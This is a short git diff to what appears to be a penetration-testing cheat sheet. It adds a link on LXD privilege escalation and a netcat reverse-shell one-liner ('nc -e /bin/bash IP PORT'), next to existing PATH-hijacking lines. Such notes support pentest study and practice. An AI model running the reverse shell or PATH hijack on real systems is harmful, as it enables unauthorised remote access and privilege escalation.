@@ -39,3 +39,13 @@ chmod 777 ls
 echo $PATH
 export PATH=/tmp:$PATH
 ```
+
+## LXD priviliege escalation (Linux Container and Linux Daemon)
+
+https://www.hackingarticles.in/lxd-privilege-escalation/
+
+## Netcat shell redirect
+
+```
+nc -e /bin/bash IP PORT
+```
